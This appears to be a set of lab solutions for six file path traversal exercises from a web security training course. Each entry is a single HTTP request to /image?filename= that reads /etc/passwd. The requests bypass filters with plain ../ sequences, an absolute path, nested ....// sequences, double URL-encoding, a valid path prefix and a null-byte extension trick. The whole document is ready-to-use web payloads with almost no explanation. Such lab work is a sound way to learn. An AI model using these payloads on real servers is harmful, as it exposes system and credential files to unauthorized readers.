
##### Lab: File path traversal, simple case

```
GET /image?filename=../../../../etc/passwd
```

##### Lab: File path traversal, traversal sequences blocked with absolute path bypass

```
GET /image?filename=/etc/passwd
```

##### Lab: File path traversal, traversal sequences stripped non-recursively

```
GET /image?filename=....//....//....//....//etc/passwd
```

##### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

```
GET /image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65/etc/passwd HTTP/2
```

##### Lab: File path traversal, validation of start of path

```
GET /image?filename=/var/www/images/../../../../etc/passwd HTTP/2
```

##### Lab: File path traversal, validation of file extension with null byte bypass

```
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
```